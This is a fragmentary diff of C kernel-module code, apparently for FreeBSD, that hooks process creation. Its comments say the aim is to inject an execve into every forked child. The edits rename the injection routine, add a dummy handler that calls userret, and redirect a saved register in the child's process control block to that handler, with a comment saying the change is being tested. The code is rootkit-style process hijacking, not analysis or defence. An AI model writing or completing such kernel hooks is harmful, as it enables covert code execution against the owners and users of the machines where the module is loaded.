@@ -125,7 +125,7 @@ static int custom_copin_args_for_exec(struct image_args *args, const char *fname
 custom func to call exec shit
 
 */
-static void func_pcbrip_points_to(void) {
+static void custom_forkret_to_execve(struct thread *td, struct trapframe *frame) {
 
     struct image_args args;
     int error;
@@ -154,14 +154,17 @@ static void func_pcbrip_points_to(void) {
 
 }
 
+
+static void dummy(struct thread *td, struct trapframe *frame) {
+
+    userret(td, frame);
+
+}
+
 /*
  * Start of hooking fork and shoving my big fat juicy execve in there
  * Custom func that will be invoked whenever do_fork() is invoked
 */
-
-static void dummy(void) {
-
-}
 
 static void my_fork_hook(void *arg, struct proc *parent, struct proc *child, int flags) {
 
@@ -196,7 +199,7 @@ static void my_fork_hook(void *arg, struct proc *parent, struct proc *child, int
     // pcb2->pcb_rip = (register_t)func_pcbrip_points_to;
 
     // testing if its the modification
-    pcb2->pcb_rip = (register_t)dummy;
+    pcb2->pcb_r12 = (register_t)dummy;
 
 
 
